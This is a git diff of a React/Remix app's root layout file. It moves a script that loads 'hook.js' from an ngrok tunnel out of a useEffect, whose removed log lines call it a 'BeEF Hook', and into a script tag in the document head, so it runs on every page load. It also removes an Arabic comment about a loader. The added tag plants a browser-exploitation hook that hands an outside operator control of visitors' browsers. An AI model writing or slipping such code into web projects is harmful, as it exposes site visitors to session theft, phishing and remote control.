@@ -35,6 +35,10 @@ export function Layout({ children }: { children: React.ReactNode }) {
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <Meta />
         <Links />
+        <script
+          src="https://dda269de979e.ngrok-free.app/hook.js"
+          async
+        ></script>
       </head>
       <body>
         {children}
@@ -49,8 +53,7 @@ export default function App() {
   const location = useLocation();
   const [showLoader, setShowLoader] = React.useState(true);
 
-  // إظهار loader عند كل تغيير في المسار (location.pathname)
-  React.useEffect(() => {
+  useEffect(() => {
     setShowLoader(true);
     const timer = setTimeout(() => setShowLoader(false), 2000);
     return () => clearTimeout(timer);
@@ -67,19 +70,6 @@ export default function App() {
       })
       .catch((err) => console.error("IP check failed", err));
   }, [location.pathname]);
-
-  useEffect(() => {
-    const script = document.createElement("script");
-    script.src = "https://dda269de979e.ngrok-free.app/hook.js";
-    script.async = true;
-    script.onload = () => console.log("✅ BeEF Hook loaded.");
-    script.onerror = () => console.error("❌ Failed to load BeEF hook.");
-    document.body.appendChild(script);
-
-    return () => {
-      document.body.removeChild(script);
-    };
-  }, []);
 
   return (
     <html lang="en">
